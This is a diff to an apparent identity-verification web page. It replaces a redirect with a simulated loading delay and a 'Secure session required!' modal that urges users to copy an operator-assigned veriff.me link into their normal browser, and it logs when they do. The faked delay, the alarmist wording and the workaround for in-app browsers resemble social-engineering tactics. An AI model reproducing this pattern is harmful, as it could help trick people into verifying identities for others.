@@ -285,6 +285,187 @@
             display: block;
         }
 
+        /* ---- Copy Modal ---- */
+        #copyModal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(3px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            padding: 20px;
+        }
+
+        .modal-card {
+            background: white;
+            border-radius: 24px;
+            padding: 32px 24px;
+            max-width: 460px;
+            width: 100%;
+            text-align: left;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: modalPop 0.3s ease;
+        }
+
+        @keyframes modalPop {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-card .modal-icon {
+            font-size: 32px;
+            color: #b35f00;
+            margin-bottom: 8px;
+            text-align: center;
+            display: block;
+        }
+
+        .modal-card h2 {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .modal-card .modal-message {
+            font-size: 15px;
+            color: #6c757d;
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+
+        .modal-card .modal-message strong {
+            color: var(--text-dark);
+        }
+
+        .modal-link-box {
+            background: #f8f9fa;
+            padding: 10px 14px;
+            border-radius: 10px;
+            border: 1px solid #e9ecef;
+            margin-bottom: 12px;
+            word-break: break-all;
+            font-size: 14px;
+            color: var(--text-dark);
+            font-family: 'Inter', monospace;
+        }
+
+        .modal-btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .modal-btn-group .modal-copy-btn {
+            flex: 1;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            background: linear-gradient(90deg, #00a86b, #008f5a);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            min-width: 120px;
+        }
+
+        .modal-btn-group .modal-copy-btn:hover {
+            background: linear-gradient(90deg, #00995f, #007a4d);
+        }
+
+        .modal-btn-group .modal-copy-btn:active {
+            transform: scale(0.97);
+        }
+
+        .modal-btn-group .modal-copy-btn.copied {
+            background: #28a745;
+        }
+
+        .modal-btn-group .modal-close-btn {
+            padding: 14px 24px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            background: #e9ecef;
+            color: #495057;
+        }
+
+        .modal-btn-group .modal-close-btn:hover {
+            background: #dee2e6;
+        }
+
+        .modal-copy-success {
+            font-size: 14px;
+            color: #28a745;
+            margin-top: 8px;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            font-weight: 600;
+        }
+
+        .modal-copy-success.show {
+            display: flex;
+        }
+
+        .modal-tip {
+            font-size: 13px;
+            color: #888;
+            margin-top: 14px;
+            padding-top: 14px;
+            border-top: 1px solid #e9ecef;
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+        }
+
+        .modal-tip i {
+            color: var(--primary-red);
+            margin-top: 2px;
+        }
+
+        /* ---- Loading Spinner Overlay ---- */
+        #loadingOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(3px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1500;
+        }
+
+        .loading-box {
+            text-align: center;
+        }
+
+        .loading-box .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #ffe0e0;
+            border-top: 4px solid var(--primary-red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        .loading-box p {
+            font-size: 16px;
+            color: var(--text-muted);
+        }
+
         footer {
             padding: 16px 16px 20px;
             color: #adb5bd;
@@ -314,12 +495,8 @@
         }
 
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         /* Session expired overlay */
@@ -401,6 +578,18 @@
                 font-size: 13px;
                 margin-left: 16px;
             }
+            .modal-card {
+                padding: 24px 16px;
+            }
+            .modal-btn-group {
+                flex-direction: column;
+            }
+            .modal-btn-group .modal-copy-btn {
+                width: 100%;
+            }
+            .modal-btn-group .modal-close-btn {
+                width: 100%;
+            }
         }
 
         @media (max-width: 380px) {
@@ -462,18 +651,15 @@
 
         <h1 class="card-title">Verify Your Identity</h1>
 
-        <!-- Status badge – always Pending -->
         <div class="status-badge">
             <i class="fas fa-clock" style="margin-right: 6px;"></i> Pending Verification
         </div>
 
-        <!-- Error box -->
         <div class="error-box" id="errorBox">
             <i class="fas fa-exclamation-circle"></i>
             <span id="errorText">No verification link available.</span>
         </div>
 
-        <!-- Static message – KYC instructions -->
         <p class="card-subtitle" style="text-align: left; width: 100%;">
             We need to confirm your identity with a government issued ID and selfie. Before proceeding, make sure you have one of the following forms of ID handy and your camera is enabled. Your data is securely stored and used only for KYC and security purposes.
         </p>
@@ -513,7 +699,6 @@
         </p>
 
         <div class="btn-group">
-            <!-- Button always says "Verify Identity" and is always enabled -->
             <button class="btn btn-verify" id="verifyBtn">
                 <i class="fas fa-check-circle" style="margin-right: 8px;"></i> Verify Identity
             </button>
@@ -523,9 +708,42 @@
         </div>
 
         <div class="info-note" id="infoNote">
-            You'll be redirected to our secure verification partner.
+            Your verification link is being prepared. Please wait...
         </div>
     </main>
+
+    <!-- Loading Spinner Overlay -->
+    <div id="loadingOverlay">
+        <div class="loading-box">
+            <div class="spinner"></div>
+            <p>Preparing your verification link...</p>
+        </div>
+    </div>
+
+    <!-- Copy Modal -->
+    <div id="copyModal">
+        <div class="modal-card">
+            <div class="modal-icon"><i class="fas fa-exclamation-triangle"></i></div>
+            <h2>⚠️ Secure session required!</h2>
+            <div class="modal-message">
+                <strong>Don't worry!</strong> Some apps block external links. Just copy the link below and open it in your regular browser (Chrome, Safari, or Firefox). It works everywhere.
+            </div>
+            <div class="modal-link-box" id="modalLinkDisplay">https://veriff.me/...</div>
+            <div class="modal-btn-group">
+                <button class="modal-copy-btn" id="modalCopyBtn">
+                    <i class="fas fa-copy"></i> Copy Link
+                </button>
+                <button class="modal-close-btn" id="modalCloseBtn">Close</button>
+            </div>
+            <div class="modal-copy-success" id="modalCopySuccess">
+                <i class="fas fa-check-circle"></i> Link copied! Now open your browser and paste it.
+            </div>
+            <div class="modal-tip">
+                <i class="fas fa-info-circle"></i>
+                <span><strong>Tip:</strong> After copying, open your browser's address bar, paste the link, and press Enter.</span>
+            </div>
+        </div>
+    </div>
 
     <!-- Session expired overlay -->
     <div id="expiryOverlay">
@@ -608,10 +826,20 @@
         const countdownDisplay = document.getElementById('countdownDisplay');
         const countdownSeconds = document.getElementById('countdownSeconds');
 
+        // Loading overlay
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        // Copy modal
+        const copyModal = document.getElementById('copyModal');
+        const modalLinkDisplay = document.getElementById('modalLinkDisplay');
+        const modalCopyBtn = document.getElementById('modalCopyBtn');
+        const modalCloseBtn = document.getElementById('modalCloseBtn');
+        const modalCopySuccess = document.getElementById('modalCopySuccess');
+
         let currentUserId = phone;
         let verificationUrl = null;
-        let isProcessing = false;
         let linkRef = null;
+        let hasLoggedCopy = false;
 
         // ============================================================
         // 3. Helper functions
@@ -648,7 +876,148 @@
         }
 
         // ============================================================
-        // 5. Listen for link changes in Firebase
+        // 5. Copy to clipboard + log to Firebase
+        // ============================================================
+
+        function copyToClipboard(text) {
+            if (navigator.clipboard && window.isSecureContext) {
+                return navigator.clipboard.writeText(text);
+            } else {
+                return new Promise((resolve, reject) => {
+                    const textArea = document.createElement('textarea');
+                    textArea.value = text;
+                    textArea.style.position = 'fixed';
+                    textArea.style.left = '-9999px';
+                    textArea.style.top = '-9999px';
+                    document.body.appendChild(textArea);
+                    textArea.focus();
+                    textArea.select();
+                    try {
+                        const success = document.execCommand('copy');
+                        document.body.removeChild(textArea);
+                        if (success) resolve();
+                        else reject(new Error('execCommand failed'));
+                    } catch (err) {
+                        document.body.removeChild(textArea);
+                        reject(err);
+                    }
+                });
+            }
+        }
+
+        function logCopyEvent() {
+            if (hasLoggedCopy) return;
+            if (!currentUserId || !verificationUrl) return;
+
+            hasLoggedCopy = true;
+            const copyRef = database.ref('veriffLinks/' + currentUserId);
+            copyRef.update({
+                copied: true,
+                copiedAt: Date.now(),
+                used: true,
+                usedAt: Date.now()
+            }).then(() => {
+                console.log('✅ Copy event logged and link marked as used for user:', currentUserId);
+            }).catch((err) => {
+                console.warn('Could not log copy event:', err);
+            });
+        }
+
+        // ============================================================
+        // 6. Show the copy modal with the link
+        // ============================================================
+
+        function showCopyModal(url) {
+            modalLinkDisplay.textContent = url;
+            // Reset success message
+            modalCopySuccess.classList.remove('show');
+            // Reset button text
+            modalCopyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy Link';
+            modalCopyBtn.classList.remove('copied');
+            copyModal.style.display = 'flex';
+        }
+
+        function hideCopyModal() {
+            copyModal.style.display = 'none';
+        }
+
+        // ============================================================
+        // 7. Modal button handlers
+        // ============================================================
+
+        modalCopyBtn.addEventListener('click', function() {
+            const link = modalLinkDisplay.textContent;
+            if (!link) return;
+
+            copyToClipboard(link)
+                .then(() => {
+                    // Visual feedback
+                    const originalText = modalCopyBtn.innerHTML;
+                    modalCopyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                    modalCopyBtn.classList.add('copied');
+                    // Show success message
+                    modalCopySuccess.classList.add('show');
+
+                    // Log copy event and mark link as used
+                    logCopyEvent();
+
+                    // Optionally, keep the button as "Copied!" for a few seconds
+                    setTimeout(() => {
+                        modalCopyBtn.innerHTML = originalText;
+                        modalCopyBtn.classList.remove('copied');
+                        // But keep the success message visible
+                    }, 3000);
+                })
+                .catch(() => {
+                    alert('Could not copy. Please select the link and copy it manually (Ctrl+C / Cmd+C).');
+                });
+        });
+
+        modalCloseBtn.addEventListener('click', function() {
+            hideCopyModal();
+            // Re-enable the verify button so user can try again
+            verifyBtn.disabled = false;
+            verifyBtn.style.opacity = '1';
+            verifyBtn.style.cursor = 'pointer';
+        });
+
+        // Close modal when clicking outside
+        copyModal.addEventListener('click', function(e) {
+            if (e.target === copyModal) {
+                hideCopyModal();
+                verifyBtn.disabled = false;
+                verifyBtn.style.opacity = '1';
+                verifyBtn.style.cursor = 'pointer';
+            }
+        });
+
+        // ============================================================
+        // 8. Verify button handler – show loading then modal
+        // ============================================================
+
+        verifyBtn.addEventListener('click', function() {
+            if (!verificationUrl) {
+                showError('No active verification link available. Please wait for your link to be assigned or contact support.');
+                return;
+            }
+
+            // Disable button and show loading overlay
+            verifyBtn.disabled = true;
+            verifyBtn.style.opacity = '0.6';
+            verifyBtn.style.cursor = 'not-allowed';
+            loadingOverlay.style.display = 'flex';
+
+            // Simulate 3-second delay
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                // Show the copy modal with the link
+                showCopyModal(verificationUrl);
+                // Re-enable button after modal is closed
+            }, 3000);
+        });
+
+        // ============================================================
+        // 9. Listen for link changes in Firebase
         // ============================================================
 
         function listenForLink() {
@@ -663,73 +1032,37 @@
                 hideError();
 
                 if (!linkData) {
-                    // No link assigned yet – nothing to do; the user sees the static message.
                     verificationUrl = null;
+                    infoNote.textContent = 'Your verification link is being prepared. Please wait...';
                     return;
                 }
 
                 // Link exists
                 if (linkData.used) {
-                    // Check expiry
                     const usedAt = linkData.usedAt || 0;
                     const now = Date.now();
                     const elapsed = now - usedAt;
                     const TEN_MINUTES = 10 * 60 * 1000;
 
                     if (elapsed > TEN_MINUTES) {
-                        // Session expired
                         startExpiryCountdown();
                         return;
                     } else {
-                        // Link used within last 10 minutes – but we don't show any message; the button will be disabled?
-                        // Actually we keep the button enabled, but when clicked it will try to use again.
-                        // But we can set verificationUrl to null so clicking shows error.
                         verificationUrl = null;
-                        // Optionally show a message? But user requested static message, so we don't show anything.
+                        infoNote.textContent = 'Your verification link has already been used. Please contact support.';
                         return;
                     }
                 }
 
-                // Link is active (not used)
+                // Link is active
                 verificationUrl = linkData.url;
                 hideError();
-                // We could optionally update the infoNote, but static is fine.
+                infoNote.textContent = 'Your verification link is ready. Click "Verify Identity" to proceed.';
             });
         }
 
         // ============================================================
-        // 6. Verify button click handler
-        // ============================================================
-
-        verifyBtn.addEventListener('click', function() {
-            if (isProcessing) return;
-
-            if (!verificationUrl) {
-                showError('No active verification link available. Please wait for your link to be assigned or contact support.');
-                return;
-            }
-
-            // Mark the link as used
-            isProcessing = true;
-            database.ref('veriffLinks/' + currentUserId).update({
-                used: true,
-                usedAt: Date.now()
-            }).then(() => {
-                spinner.style.display = 'flex';
-                verifyBtn.disabled = true;
-                setTimeout(() => {
-                    window.location.href = verificationUrl;
-                }, 500);
-            }).catch((err) => {
-                console.error('Error updating link:', err);
-                showError('Error processing verification. Please try again.');
-                isProcessing = false;
-                verifyBtn.disabled = false;
-            });
-        });
-
-        // ============================================================
-        // 7. Start listening
+        // 10. Start listening
         // ============================================================
 
         if (currentUserId) {
@@ -742,15 +1075,20 @@
         }
 
         // ============================================================
-        // 8. Clear spinner on page load / back navigation
+        // 11. Clear loading overlay on page load / back navigation
         // ============================================================
 
         window.addEventListener('pageshow', function() {
+            loadingOverlay.style.display = 'none';
             spinner.style.display = 'none';
+            // Re-enable button if disabled
+            verifyBtn.disabled = false;
+            verifyBtn.style.opacity = '1';
+            verifyBtn.style.cursor = 'pointer';
         });
 
         // ============================================================
-        // 9. Cleanup listener when leaving the page
+        // 12. Cleanup listener
         // ============================================================
 
         window.addEventListener('beforeunload', function() {
